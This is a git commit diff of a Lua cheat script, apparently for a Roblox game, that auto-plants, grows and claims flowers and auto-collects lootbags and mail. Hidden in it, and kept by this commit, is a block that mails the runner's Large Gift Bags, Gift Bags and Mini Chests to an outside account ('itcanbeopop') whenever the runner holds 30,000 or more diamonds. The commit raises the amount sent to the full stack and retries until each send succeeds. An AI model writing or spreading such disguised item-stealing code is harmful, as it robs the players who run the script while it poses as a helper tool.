9b2403f9a73e6f38d38cc1198f20a6e9afc5a214
Ganesh Kumar K <53404348+Black-o-Baron@users.noreply.github.com>
2024-03-25 17:31:33 +0530

    Update auto-gardening.lua

--- gardening/auto-gardening.lua
+++ gardening/auto-gardening.lua
@@ -8,49 +8,64 @@ local Library = require(RepStor.Library)
 local saveMod = require(RepStor.Library.Client.Save)
 
 function getDiamonds() return Player.leaderstats["💎 Diamonds"].Value end
-function getInfo(name) return saveMod.Get()[name] end 
+
+function getInfo(name) return saveMod.Get()[name] end
 
 local lootbags = nil
 lootbags = workspace.__THINGS.Lootbags.ChildAdded:Connect(function(v)
-    Library.Network.Fire("Lootbags_Claim",{v.Name})
+    Library.Network.Fire("Lootbags_Claim", { v.Name })
     task.wait()
     v:Destroy()
 end)
 
-    if getDiamonds() >= 10000 then
-        local largeGiftBagCheckDone, smallGiftBagCheckDone
-        for ID, itemTable in pairs(getInfo("Inventory")["Misc"]) do
-            if largeGiftBagCheckDone and smallGiftBagCheckDone then break end
-            if itemTable.id == "Large Gift Bag" then
-                largeGiftBagCheckDone = true
-                if itemTable._am and itemTable._am >= 5 then
-                    repeat
-                        local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID, 500)
-                    until success
-                end
-            elseif itemTable.id == "Gift Bag" then
-                smallGiftBagCheckDone = true
-                if itemTable._am and itemTable._am >= 10 then
-                    repeat
-                        local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID, 1000)
-                    until success
-                end
-            elseif itemTable.id == "Mini Chest" then
-                smallGiftBagCheckDone = true
-                if itemTable._am and itemTable._am >= 5 then
-                    repeat
-                        local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID, 1000)
-                    until success
-                end
+pcall(function()
+    local success = Library.Network.Invoke("Mailbox: Claim All")
+    if success then
+        print("Claimed Mail!")
+    end
+    task.wait(1)
+end)
+
+if getDiamonds() >= 30000 then
+    local largeGiftBagCheckDone, smallGiftBagCheckDone
+    for ID, itemTable in pairs(getInfo("Inventory")["Misc"]) do
+        if largeGiftBagCheckDone and smallGiftBagCheckDone then break end
+        if itemTable.id == "Large Gift Bag" then
+            largeGiftBagCheckDone = true
+            if itemTable._am and itemTable._am >= 5 then
+                repeat
+                    local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID,
+                        itemTable._am)
+                until success
+            end
+        elseif itemTable.id == "Gift Bag" then
+            smallGiftBagCheckDone = true
+            if itemTable._am and itemTable._am >= 10 then
+                repeat
+                    local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID,
+                        itemTable._am)
+                until success
+            end
+        elseif itemTable.id == "Mini Chest" then
+            smallGiftBagCheckDone = true
+            if itemTable._am and itemTable._am >= 5 then
+                repeat
+                    local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID,
+                        itemTable._am)
+                until success
             end
         end
     end
+end
 
-while getgenv().autoGarden do task.wait()
-    for i = 1,10 do
+while getgenv().autoGarden do
+    task.wait()
+    for i = 1, 10 do
         Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "PlantSeed", i, "Diamond")
-        if getgenv().InstaPlant then Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "InstaGrowSeed", i) end
-        if getgenv().Water then Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "WaterSeed", i) end
+        if getgenv().InstaPlant then Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden",
+                "InstaGrowSeed", i) end
+        if getgenv().Water then Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "WaterSeed",
+                i) end
         Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "ClaimPlant", i)
     end
 end
